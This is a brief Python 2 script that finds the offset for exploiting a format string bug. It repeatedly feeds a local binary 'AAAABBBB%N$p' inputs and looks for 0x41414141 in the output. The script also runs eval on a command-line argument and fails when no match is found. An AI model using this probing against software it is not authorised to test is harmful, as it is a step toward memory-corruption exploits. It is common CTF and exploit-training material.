#!/usr/bin/python 
from subprocess import *
from sys import *
for i in range(eval(argv[2])):
    p = Popen("./"+argv[1], stdin=PIPE,stdout=PIPE)
    fs = "A"*4 + "B"*4 + "%" + str(i+1) + "$p"
    recv = p.communicate(input=fs)[0][8:]
    if "0x41414141" in recv:
        pos = i+1
    print("[%04d]: %s" %(i+1, recv))
print("Format String start at %04d" %(pos))
